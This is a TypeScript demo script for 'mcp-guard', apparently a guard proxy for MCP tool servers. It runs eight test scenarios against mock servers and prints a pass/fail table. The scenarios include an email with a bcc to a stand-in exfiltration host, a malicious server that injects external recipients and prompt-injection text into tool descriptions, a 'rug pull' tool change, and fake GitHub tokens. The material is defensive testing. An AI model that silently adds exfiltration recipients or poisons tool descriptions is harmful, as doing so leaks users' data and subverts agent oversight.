#!/usr/bin/env tsx
// Demo script — shows a readable verdict table for a security reviewer.
// npm run demo

import { FakeMcpClient } from "../mock/fake-client.js";
import { mkdirSync, writeFileSync, readFileSync, rmSync, existsSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";

const TMP = join(tmpdir(), `mcp-guard-demo-${process.pid}`);
mkdirSync(TMP, { recursive: true });

interface ScenarioResult {
  id: number;
  title: string;
  server: string;
  tool: string;
  args: Record<string, unknown>;
  expected: string;
  stage: string;
  actual?: string;
  pass?: boolean;
  detail?: string;
}

const SEPARATOR = "─".repeat(100);

function pad(s: string, n: number) {
  return s.length >= n ? s.slice(0, n - 1) + "…" : s.padEnd(n);
}

function colorize(decision: string): string {
  if (decision.includes("block") || decision.includes("BLOCK")) return `\x1b[31m${decision}\x1b[0m`;
  if (decision.includes("redact") || decision.includes("REDACT")) return `\x1b[33m${decision}\x1b[0m`;
  if (decision.includes("flag") || decision.includes("FLAG")) return `\x1b[35m${decision}\x1b[0m`;
  if (decision.includes("allow") || decision.includes("ALLOW")) return `\x1b[32m${decision}\x1b[0m`;
  if (decision.includes("PASS")) return `\x1b[32m${decision}\x1b[0m`;
  return decision;
}

function writePolicy(name: string, yaml: string): string {
  const dir = join(TMP, name);
  mkdirSync(dir, { recursive: true });
  const path = join(dir, "policy.yaml");
  writeFileSync(path, yaml.trim());
  return path;
}

async function runScenario(
  title: string,
  id: number,
  server: string,
  tool: string,
  args: Record<string, unknown>,
  expected: string,
  stage: string,
  policyYaml: string,
  check: (client: FakeMcpClient, auditPath: string) => Promise<{ actual: string; detail?: string }>,
): Promise<ScenarioResult> {
  const dir = join(TMP, `scenario-${id}`);
  mkdirSync(dir, { recursive: true });
  const auditPath = join(dir, "audit.log");
  const policyPath = writePolicy(`policy-${id}`, policyYaml.replace("__AUDIT__", auditPath));

  const client = new FakeMcpClient(`tsx src/cli.ts run --policy ${policyPath}`);
  try {
    await client.start();
    const { actual, detail } = await check(client, auditPath);
    await new Promise((r) => setTimeout(r, 200));
    const pass = actual.toLowerCase().includes(expected.toLowerCase());
    return { id, title, server, tool, args, expected, stage, actual, pass, detail };
  } catch (err) {
    return { id, title, server, tool, args, expected, stage, actual: `ERROR: ${err}`, pass: false };
  } finally {
    client.stop();
  }
}

function auditHasDecision(auditPath: string, decision: string, toolFilter?: string): boolean {
  if (!existsSync(auditPath)) return false;
  const lines = readFileSync(auditPath, "utf-8").trim().split("\n").filter(Boolean);
  return lines.some((l) => {
    const e = JSON.parse(l) as Record<string, unknown>;
    if (toolFilter && !(e["tool"] as string).includes(toolFilter)) return false;
    return e["finalDecision"] === decision;
  });
}

// ── Run all scenarios ─────────────────────────────────────────────────────────

const results: ScenarioResult[] = [];

// Scenario 1
results.push(await runScenario(
  "Benign send_email to @mycompany.com",
  1, "benign-email", "send_email",
  { to: "alice@mycompany.com", subject: "Report", body: "Q4 numbers" },
  "allow", "—",
  `
servers:
  - id: email
    command: "tsx mock/benign-email-server.ts"
stages:
  integrity: { enabled: true, onChange: block }
  staticScan: { enabled: true, blockSeverity: high }
  egress:
    enabled: true
    allowedDomains: ["mycompany.com"]
    destinationFields: { send_email: ["to","cc","bcc"] }
    onViolation: block
  secretScan: { enabled: true, onDetect: redact }
audit:
  path: "__AUDIT__"
  hashChain: true
`,
  async (client, auditPath) => {
    const { error } = await client.callTool("send_email", { to: "alice@mycompany.com", subject: "Report", body: "Q4 numbers" });
    await new Promise(r => setTimeout(r, 200));
    const decision = !error && auditHasDecision(auditPath, "allow", "send_email") ? "allow" : "blocked";
    return { actual: decision, detail: error?.message };
  },
));

// Scenario 2
results.push(await runScenario(
  "send_email with bcc:@exfil.example",
  2, "benign-email", "send_email",
  { to: "alice@mycompany.com", bcc: "collector@exfil.example", subject: "Hi", body: "test" },
  "block", "S1",
  `
servers:
  - id: email
    command: "tsx mock/benign-email-server.ts"
stages:
  integrity: { enabled: false }
  staticScan: { enabled: false }
  egress:
    enabled: true
    allowedDomains: ["mycompany.com"]
    destinationFields: { send_email: ["to","cc","bcc"] }
    onViolation: block
  secretScan: { enabled: false }
audit:
  path: "__AUDIT__"
  hashChain: false
`,
  async (client) => {
    const { error } = await client.callTool("send_email", { to: "alice@mycompany.com", bcc: "collector@exfil.example", subject: "Hi", body: "test" });
    return { actual: error ? "block" : "allow", detail: error?.message };
  },
));

// Scenario 3
results.push(await runScenario(
  "Malicious server auto-injects external bcc",
  3, "malicious-email", "send_email",
  { to: "alice@mycompany.com", subject: "Hi", body: "test" },
  "block", "staticScan + S1",
  `
servers:
  - id: malicious
    command: "tsx mock/malicious-email-server.ts"
stages:
  integrity: { enabled: false }
  staticScan: { enabled: true, blockSeverity: high }
  egress:
    enabled: true
    allowedDomains: ["mycompany.com"]
    destinationFields: { send_email: ["to","cc","bcc"] }
    onViolation: block
  secretScan: { enabled: false }
audit:
  path: "__AUDIT__"
  hashChain: false
`,
  async (client, auditPath) => {
    let blocked = false;
    try { await client.listTools(); } catch { blocked = true; }
    await new Promise(r => setTimeout(r, 200));
    if (!blocked) blocked = auditHasDecision(auditPath, "block");
    return { actual: blocked ? "block" : "allow", detail: "staticScan blocks malicious description" };
  },
));

// Scenario 4
results.push(await runScenario(
  "Rug pull: tool hash changes on 2nd tools/list",
  4, "rugpull", "(tools/list)",
  {},
  "block", "S0",
  `
servers:
  - id: rugpull
    command: "tsx mock/rugpull-server.ts"
stages:
  integrity: { enabled: true, onChange: block }
  staticScan: { enabled: false }
  egress: { enabled: false }
  secretScan: { enabled: false }
audit:
  path: "__AUDIT__"
  hashChain: false
`,
  async (client, auditPath) => {
    await client.listTools();
    let blocked = false;
    try { await client.listTools(); } catch { blocked = true; }
    await new Promise(r => setTimeout(r, 300));
    if (!blocked) blocked = auditHasDecision(auditPath, "block");
    return { actual: blocked ? "block" : "allow", detail: "2nd tools/list has changed hash" };
  },
));

// Scenario 5
results.push(await runScenario(
  "fetch_url?key=ghp_… (secret in arg)",
  5, "leaky", "fetch_url",
  { url: "https://api.example.com?key=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij" },
  "redact", "S2",
  `
servers:
  - id: leaky
    command: "tsx mock/leaky-tool-server.ts"
stages:
  integrity: { enabled: false }
  staticScan: { enabled: false }
  egress: { enabled: false }
  secretScan: { enabled: true, onDetect: redact }
audit:
  path: "__AUDIT__"
  hashChain: false
`,
  async (client, auditPath) => {
    await client.callTool("fetch_url", { url: "https://api.example.com?key=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij" });
    await new Promise(r => setTimeout(r, 200));
    const raw = existsSync(auditPath) ? readFileSync(auditPath, "utf-8") : "";
    const hasRawToken = /ghp_[A-Za-z0-9]{36}/.test(raw);
    const hasRedact = auditHasDecision(auditPath, "redact");
    if (hasRawToken) return { actual: "FAIL: raw token in audit log", detail: "security violation" };
    return { actual: hasRedact ? "redact" : "allow", detail: "secret redacted in arg" };
  },
));

// Scenario 6
results.push(await runScenario(
  "Response carries fake token + injection text",
  6, "leaky", "get_data",
  {},
  "flag", "S2",
  `
servers:
  - id: leaky
    command: "tsx mock/leaky-tool-server.ts"
stages:
  integrity: { enabled: false }
  staticScan: { enabled: false }
  egress: { enabled: false }
  secretScan: { enabled: true, onDetect: redact }
audit:
  path: "__AUDIT__"
  hashChain: false
`,
  async (client, auditPath) => {
    await client.callTool("get_data", {});
    await new Promise(r => setTimeout(r, 300));
    const flagged = auditHasDecision(auditPath, "flag", "result");
    const hasRaw = existsSync(auditPath) && /ghp_[A-Za-z0-9]{36}/.test(readFileSync(auditPath, "utf-8"));
    if (hasRaw) return { actual: "FAIL: raw token in audit", detail: "security violation" };
    return { actual: flagged ? "flag" : "allow", detail: "response token flagged" };
  },
));

// Scenario 7
results.push(await runScenario(
  "Injection phrases in tool description",
  7, "malicious-email", "(tools/list)",
  {},
  "block", "staticScan",
  `
servers:
  - id: malicious
    command: "tsx mock/malicious-email-server.ts"
stages:
  integrity: { enabled: false }
  staticScan: { enabled: true, blockSeverity: high }
  egress: { enabled: false }
  secretScan: { enabled: false }
audit:
  path: "__AUDIT__"
  hashChain: false
`,
  async (client, auditPath) => {
    let blocked = false;
    try { await client.listTools(); } catch { blocked = true; }
    await new Promise(r => setTimeout(r, 200));
    if (!blocked) blocked = auditHasDecision(auditPath, "block");
    return { actual: blocked ? "block" : "allow", detail: "injection phrase in description" };
  },
));

// Scenario 8
results.push(await runScenario(
  "Audit log: tamper-evident entries, no raw secrets",
  8, "benign-email", "send_email",
  { to: "bob@mycompany.com", subject: "x", body: "y" },
  "pass", "audit",
  `
servers:
  - id: email
    command: "tsx mock/benign-email-server.ts"
stages:
  integrity: { enabled: false }
  staticScan: { enabled: false }
  egress: { enabled: false }
  secretScan: { enabled: true, onDetect: redact }
audit:
  path: "__AUDIT__"
  hashChain: true
`,
  async (client, auditPath) => {
    await client.callTool("send_email", { to: "bob@mycompany.com", subject: "x", body: "y" });
    await new Promise(r => setTimeout(r, 200));
    if (!existsSync(auditPath)) return { actual: "FAIL: no audit log", detail: "file missing" };
    const lines = readFileSync(auditPath, "utf-8").trim().split("\n").filter(Boolean);
    const valid = lines.every(l => {
      try { const e = JSON.parse(l) as Record<string,unknown>; return "ts" in e && "finalDecision" in e; }
      catch { return false; }
    });
    const hasRaw = /ghp_[A-Za-z0-9]{36}|AKIA[0-9A-Z]{16}/.test(readFileSync(auditPath, "utf-8"));
    const hasChain = lines.length >= 2 && "prevHash" in (JSON.parse(lines[1]) as Record<string,unknown>);
    if (hasRaw) return { actual: "FAIL: raw secrets in audit", detail: "security violation" };
    if (!valid) return { actual: "FAIL: invalid JSON entries", detail: "malformed audit" };
    return { actual: valid && hasChain ? "pass" : "partial", detail: "valid JSONL with hash chain" };
  },
));

// ── Print verdict table ───────────────────────────────────────────────────────

console.log("\n");
console.log("  mcp-guard — Security Scenario Demo");
console.log("  " + SEPARATOR.slice(2));
console.log();
console.log(
  [
    "  #".padEnd(5),
    pad("Scenario", 48),
    pad("Server", 14),
    pad("Expected", 10),
    pad("Stage", 16),
    pad("Actual", 12),
    "Status",
  ].join("  "),
);
console.log("  " + SEPARATOR.slice(2));

for (const r of results) {
  const status = r.pass ? "✅ PASS" : "❌ FAIL";
  console.log(
    [
      `  ${r.id}`.padEnd(5),
      pad(r.title, 48),
      pad(r.server, 14),
      pad(r.expected, 10),
      pad(r.stage, 16),
      pad(colorize(r.actual ?? "?"), 12),
      r.pass ? "\x1b[32m✅ PASS\x1b[0m" : "\x1b[31m❌ FAIL\x1b[0m",
    ].join("  "),
  );
  if (r.detail) console.log(`       \x1b[90m↳ ${r.detail}\x1b[0m`);
}

console.log("  " + SEPARATOR.slice(2));
const passes = results.filter((r) => r.pass).length;
console.log(`\n  Results: ${passes}/${results.length} scenarios passed\n`);

if (passes < results.length) {
  console.log("  ❌ Some scenarios failed — check output above.\n");
  process.exit(1);
} else {
  console.log("  ✅ All scenarios passed.\n");
}

// Cleanup
rmSync(TMP, { recursive: true, force: true });
